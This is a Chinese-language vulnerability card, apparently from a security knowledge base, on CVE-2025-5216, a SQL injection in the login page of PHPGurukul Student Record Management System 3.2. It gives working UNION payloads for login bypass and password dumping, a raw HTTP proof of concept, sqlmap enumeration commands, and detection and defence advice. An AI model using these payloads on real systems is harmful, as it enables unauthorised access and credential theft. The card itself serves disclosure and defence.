---
id: web-generic-sqli-phpgurukul-student-record-login-union
title: PHPGurukul Student Record Management System 3.2 login.php 登录处 UNION 注入（CVE-2025-5216）
type: scenario
domain: web
path: web/generic/sqli
technique: php-login-union-sqli-dbname-reflection
aliases:
- CVE-2025-5216
- Student Record Management System SQL 注入
- login.php union select database()
- PHPGurukul SRMS SQLi
- 登录绕过并回显数据库名
tags:
- php
- sql-injection
- union
- login-bypass
- mysql
- php-gurukul
- cve-2025-5216
cve:
- CVE-2025-5216
severity: high
confidence: high
affected_versions: 3.2（原文受影响版本）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V55
  verified_at: '2026-11-05T09:00:18+08:00'
  notes: 已对照原文与15张图核对：login.php 拼接 id/password、payload id=-1'union select 1,database()# 返回302并回显 WELCOME STUDENTRECORDDB、sqlmap 取 information_schema/studentrecorddb 均与图11-15一致；原文受影响版本写 V3.2（NVD 描述写 3.20），卡内按原文 3.2；NVD CNA CVSS 6.9 Medium，卡 severity high 为主观评级。PoC 未在本机执行；frontmatter 无 sources/source_url。
---

## 一句话结论

PHPGurukul Student Record Management System 3.2 的 `/login.php` 把 `$_POST['id']`、`$_POST['password']` 直接拼进 `select ID,loginid from tbl_login where loginid='$uname' && password='$Password'`，未做过滤或预处理；提交 `id=-1'union select 1,database()#` 即可闭合引号、注释掉密码条件，并在登录后的 dashboard 回显数据库名。

## 原理

- 漏洞代码：
  ```php
  $uname = $_POST['id'];
  $Password = $_POST['password'];
  $query = mysqli_query($con, "select ID,loginid from tbl_login where loginid='$uname' && password='$Password'");
  $ret = mysqli_fetch_array($query);
  if($ret>0){
      $_SESSION['aid'] = $ret['ID'];
      $_SESSION['login'] = $ret['loginid'];
      header('location:dashboard.php');
  }
  ```
  `id` 与 `password` 都没有 `mysqli_real_escape_string`、类型转换或预处理，直接进入单引号包裹的 SQL。
- 注入 `id=-1'union select 1,database()#` 后语句变为：
  ```sql
  select ID,loginid from tbl_login where loginid='-1' union select 1,database()#' && password='...'
  ```
  原查询无结果，`UNION` 的第二行返回 `ID=1`、`loginid=<当前数据库名>`；`mysqli_fetch_array` 取到该行，`$ret>0` 成立，Session 被写入，响应 302 跳转 dashboard。
- dashboard 会把 `$_SESSION['login']` 当作登录名展示，因此数据库名以 `WELCOME STUDENTRECORDDB` 的形式回显；即使不回显，302 + 登录态也证明 UNION 注入成功。
- `tbl_login` 的查询列为两列（ID、loginid），所以 UNION 必须同样返回两列；`#` 注释掉后续 `&& password=...`，无需知道真实密码。原文在 MySQL 8.0.11 实测成功，sqlmap 进一步枚举出 `information_schema` 与 `studentrecorddb`。

## 触发条件

- 目标为 PHPGurukul Student Record Management System 3.2（原文测试环境 Apache 2.4.39 / PHP 7.4.3 / MySQL 8.0.11）。
- `/login.php` 可访问，登录表单包含 `id`、`password`、`submit` 参数，且无验证码/WAF 拦截。
- 数据库为 MySQL/MariaDB，支持 `UNION SELECT` 与 `#` 注释。
- 不需要有效账号；注入在认证前发生。

## 利用步骤

1. 访问 `/login.php`，确认登录请求为 POST，参数 `id`、`password`、`submit`。
2. 发送 `id=-1'union select 1,database()#&password=123123&submit=login`。
3. 服务端返回 302 跳转 `dashboard.php`；跟随跳转后页面显示 `WELCOME <数据库名>`，确认注入与登录绕过。
4. 把 `database()` 换成 `user()`、`version()`、`@@datadir` 等做信息收集；或 `union select 1,group_concat(loginid,0x3a,password) from tbl_login` 读取账号口令。
5. 使用 sqlmap 批量枚举：
   ```bash
   python sqlmap.py -r post.txt --dbs --batch
   ```
   原文得到 `information_schema`、`studentrecorddb` 两个库，并可继续 `--tables`/`--dump`。

## PoC

```http
POST /login.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

id=-1'union select 1,database()#&password=123123&submit=login
```

响应：

```http
HTTP/1.1 302 Found
Location: dashboard.php
```

跟随跳转后 dashboard 显示：

```text
WELCOME STUDENTRECORDDB
```

读取账号口令的变体：

```text
id=-1'union select 1,group_concat(loginid,0x3a,password) from tbl_login#&password=x&submit=login
```

## 变体与关联

- 变体：布尔/时间盲注（`AND SLEEP(5)`）、报错注入、堆叠查询（取决于 `mysqli_query` 与数据库权限）；sqlmap 已自动识别 UNION 与布尔盲注。
- 变体：同系统其他页面若同样拼接 SQL（原文截图中 `add-course.php` 的 INSERT 也直接拼接变量），可能在登录后形成二次注入，但原文未验证，本卡不展开。
- 关联：[[web-generic-sqli-phpgurukul-myprofile-cgpa-time-blind]]（同厂商另一产品的时间盲注）；登录处 UNION 注入通用卡。

## 检测与防御

- 检测：登录请求的 `id`/`password` 中出现单引号、`union`、`#`、`--`、`sleep(` 等特征；登录成功但用户名显示为数据库名/函数结果；短时间内大量 sqlmap 特征请求。
- 防御：使用 `mysqli_prepare` + `bind_param` 参数化查询；对输入做长度/类型校验，但不要把黑名单当唯一防线。
- 防御：密码使用 `password_hash()` 存储并用 `password_verify()` 校验，不要在 SQL 中比较明文口令；登录成功后 `session_regenerate_id(true)`。
- 防御：数据库账号最小权限，关闭不必要的 `FILE`/堆叠能力；部署 WAF 仅作补充。
